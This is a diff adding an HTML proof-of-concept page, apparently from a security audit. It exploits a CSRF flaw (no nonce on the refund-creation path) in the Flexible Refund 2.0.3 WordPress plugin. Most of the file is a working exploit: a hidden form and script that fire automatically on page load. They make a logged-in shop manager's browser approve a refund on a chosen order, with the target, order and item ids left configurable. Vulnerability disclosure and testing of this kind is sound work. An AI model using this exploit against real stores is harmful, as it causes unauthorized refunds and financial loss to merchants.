@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>CSRF PoC — Flexible Refund 2.0.3 create_refund</title></head>
+<body>
+<h1>CSRF PoC — wp_ajax_fr_refund_request (creation path, no nonce)</h1>
+<p>
+Finding B2 (CWE-352). The creation path of <code>Ajax::create_refund()</code>
+(<code>request_id == 0</code>) checks capabilities but <strong>not</strong> a nonce
+(only the update path, <code>request_id &gt; 0</code>, calls <code>check_ajax_referer</code>).
+A logged-in shop_manager/admin who loads this page triggers a real, approved refund
+on the chosen order — no token, cross-site.
+</p>
+<p>
+Configure below:
+<code>TARGET</code> = store origin,
+<code>ORDER_ID</code> = order to refund,
+<code>ITEM_ID</code> = a line-item id of that order (from
+<code>wp_woocommerce_order_items.order_item_id</code>; small, enumerable integer).
+</p>
+
+<form id="f" method="POST">
+  <input type="hidden" name="action"   value="fr_refund_request">
+  <input type="hidden" name="order_ID" value="">
+  <input type="hidden" name="status"   value="approved">
+  <!-- request_id omitted/0 => creation path => no nonce required -->
+  <!-- "form" is a urlencoded query string; items[<ITEM_ID>][qty] must be a line of ORDER_ID -->
+  <input type="hidden" name="form" value="">
+  <noscript><button type="submit">Run PoC</button></noscript>
+</form>
+
+<script>
+  var TARGET   = "http://localhost:8088";   // <-- store origin
+  var ORDER_ID = "12";                       // <-- target order id
+  var ITEM_ID  = "2";                         // <-- a line-item id belonging to ORDER_ID
+  var f = document.getElementById("f");
+  f.action = TARGET + "/wp-admin/admin-ajax.php";
+  f.order_ID.value = ORDER_ID;
+  f.form.value = "fr_refund_form[items][" + ITEM_ID + "][qty]=1";
+  f.submit();   // auto-fire
+</script>
+</body>
+</html>
